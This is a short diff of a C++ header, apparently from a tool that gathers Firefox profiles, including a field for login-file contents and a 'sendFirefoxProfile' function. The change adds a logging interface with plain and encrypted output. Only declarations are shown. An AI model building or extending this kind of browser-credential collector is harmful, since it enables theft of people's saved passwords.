@@ -1,4 +1,5 @@
 #include "Includes.h"
+#include "Logs.h"
 #pragma once
 
 struct Profile {
@@ -9,7 +10,7 @@ struct Profile {
 	std::string LoginsFileContent;
 };
 
-struct Browsers {
+struct Browsers : public Logs {
 	
 	std::vector<Profile> FirefoxProfileList;
 
@@ -50,5 +51,11 @@ struct Browsers {
 	*/
 	
 	int sendFirefoxProfile();
+
+
+
+	///LOGS Interface implementation
+	bool OutputFile(const std::string& message, const std::string& path) override;
+	bool OutputEncryptedContent(const std::string& message, const std::string& path) noexcept override;
 
 };
